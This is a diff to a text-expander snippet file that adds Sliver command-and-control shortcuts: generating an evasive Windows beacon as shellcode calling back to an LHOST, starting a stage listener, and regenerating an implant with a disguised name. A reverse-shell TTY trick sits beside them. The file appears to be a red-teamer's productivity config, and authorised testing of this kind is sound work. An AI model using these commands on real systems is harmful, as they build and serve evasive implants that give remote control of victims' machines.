@@ -184,6 +184,13 @@ matches:
   - trigger: ":astty"
     replace: stty raw -echo; fg
 
+  #### Sliver
+  - trigger: ":sliver_beacon"
+    replace: profiles new beacon --evasion --os windows --format shellcode -b http://{{LHOST}} win-http
+  - trigger: ":sliver_listener"
+    replace: stage-listener --url http://{{LHOST}}:80 --profile win-profile
+  - trigger: ":sliver_implant"
+    replace: regenerate --save /tmp/LEGITIMATE LEGITIMATE_CARNATION
   # Print the current date
   - trigger: ":date"
     replace: "{{mydate}}"
